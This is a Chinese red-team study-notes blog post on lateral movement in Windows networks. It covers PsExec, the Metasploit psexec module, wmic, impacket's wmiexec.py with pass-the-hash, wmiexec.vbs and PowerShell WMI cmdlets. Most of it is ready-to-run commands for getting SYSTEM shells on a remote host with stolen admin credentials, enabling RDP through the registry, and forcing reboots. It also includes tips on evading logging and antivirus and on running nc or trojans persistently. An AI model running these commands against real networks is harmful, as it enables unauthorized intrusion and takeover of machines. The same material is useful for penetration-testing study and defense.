---
title: 【内网学习笔记】22、PsExec 和 WMI 的使用
date: 2021-09-02 13:23:26
id: 210902-132326
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902122716.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 1、PsExec

### PsExec.exe

PsExec 在之前的文章里提到过一次，参见[https://teamssix.com/210802-181052.html](https://teamssix.com/210802-181052.html)，今天来着重学习一下。

PsExec 是 PSTools 工具包里的一部分，其下载地址为：[https://download.sysinternals.com/files/PSTools.zip](https://download.sysinternals.com/files/PSTools.zip)

利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。

建立 ipc$ 连接

```
net use \\192.168.7.7\ipc$ "1qaz@WSX" /user:administrator
或者
net use \\192.168.7.7 /u:teamssix.com\administrator "1qaz@WSX"
```

在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限

```
PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe
```

```
-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框
-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902092309.png)

如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接

```
PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe
```

```
-u 域\用户名
-p 密码
```

或者执行以下命令直接回显命令结果

```
PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe /c "ipconfig"
```

在使用 PsExec 时需要注意以下几点：

* 需要远程系统开启 admin$ 共享（默认是开启的）
* 因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口
* 在使用 IPC$ 连接目标系统后，不需要输入账户和密码。
* 在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。
* 使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell
* 在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。

### MSF

MSF 中也有 PsExec 的利用模块，使用方法如下：

```
use exploit/windows/smb/psexec
set rhost 192.168.7.7
set smbuser administrator
set smbpass 1qaz@WSX
run
```

## 2、WMI

WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。

由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。

### wmic 命令

WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中

> 使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)

```
wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX process call create "cmd.exe /c ipconfig > c:\ip.txt"
```

之后建立 IPC$ ，使用 type 读取执行结果

```
net use \\192.168.7.7\ipc$ "1qaz@WSX" /user:administrator
type \\192.168.7.7\C$\ip.txt
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902112523.png)

也可以预先建立 ipc$ 连接，再使用 wmic

```
net use \\192.168.7.7\ipc$ "1qaz@WSX" /user:administrator
wmic /node:192.168.7.7 process call create "cmd.exe /c ipconfig >c:\ip.txt"
type \\192.168.7.7\C$\ip.txt
```

### wmiexec.py

在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell

```
python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902113920.png)

wmiexec.py 还支持通过哈希传递获得 shell

```
python3 wmiexec.py -hashes LMHash:NTHash 域名/用户名@目标IP
```

### wmiexec.vbs

wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：[https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs](https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs)

```
cscript //nologo wmiexec.vbs /shell 192.168.7.7 administrator 1qaz@WSX
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902122716.png)

使用 vmiexec.vbs 执行单条命令

```
cscript wmiexec.vbs /cmd 192.168.7.7 administrator 1qaz@WSX "ipconfig"
```

因为这只是个半交互式的 Shell，因此对于运行时间比较长的命令，比如 ping、systeminfo 等，需要加上 -wait 5000 或更长的时间。

在运行 nc 等不需要输出结果但需要一直运行的进程时，可以使用 -persist 参数，当命令加了 -persist 选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，这样就可以运行 nc 或者木马程序了。

不过目前 vmiexec.vbs 已经被卡巴斯基、赛门铁克等杀软列入查杀名单了。

### Invoke-WmiCommand

Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。

在 Powershell 中运行以下命令

```
# 导入 Invoke-WmiCommand.ps1 脚本
Import-Module .\Invoke-WmiCommand.ps1

# 指定目标系统用户名
$User = "teamssix.com\administrator" 

# 指定目标系统的密码
$Password = ConvertTo-SecureString -String "1qaz@WSX" -AsPlainText -Force

# 将账号和密码整合起来，以便导入 Credential
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password

# 指定要执行的命令和目标 IP
$Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.7.7

# 将执行结果输出到屏幕上
$Remote.PayloadOutput
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902130614.png)

### Invoke-WMIMethod

Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。

```
# 指定目标系统用户名
$User="teamssix.com\administrator"

# 指定目标系统密码
$Password=ConvertTo-SecureString -String "1qaz@WSX" -AsPlainText -Force

# 将账号和密码整合起来，以便导入 Credential中
$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password

# 在远程系统中运行 calc.exe 命令
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.7.7" -Credential $Cred
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902131658.png)

可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。

### wmic 的其他命令

使用 wmic 远程开启目标的 RDP

```
# 适于 Windows xp、server 2003
wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1

# 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostname
wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX RDTOGGLE WHERE ServerName='dc' call SetAllowTSConnections 1
或者
wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
```

判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。

```
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```

 ![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902135523.png)

使用 wmic 远程重启目标计算机

```
wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX process call create "shutdown.exe -r -f -t 0"
```

>  参考文章：
>
>  [https://cloud.tencent.com/developer/article/1752180](https://cloud.tencent.com/developer/article/1752180)
>
>  [https://www.freebuf.com/articles/246440.html](https://www.freebuf.com/articles/246440.html)
>
>  更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
